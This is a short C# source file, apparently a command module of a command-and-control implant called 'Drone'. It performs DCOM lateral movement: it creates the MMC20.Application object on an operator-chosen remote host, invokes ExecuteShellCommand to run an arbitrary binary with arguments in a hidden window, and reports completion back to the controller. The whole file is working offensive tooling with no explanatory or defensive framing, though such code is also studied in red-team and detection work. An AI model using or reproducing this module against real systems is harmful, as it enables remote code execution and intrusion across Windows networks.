using System;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class DcomCommand : DroneCommand
{
    public override byte Command => 0x5F;
    public override bool Threaded => false;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var type = Type.GetTypeFromProgID("MMC20.Application", task.Arguments["target"]);
        var obj = Activator.CreateInstance(type);
        var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
        var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);

        if (!task.Arguments.TryGetValue("args", out var args))
            args = string.Empty;

        view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view,
            new object[]
            {
                task.Arguments["binary"],
                null,
                args,
                "7"
            });

        await Drone.SendTaskComplete(task.Id);
    }
}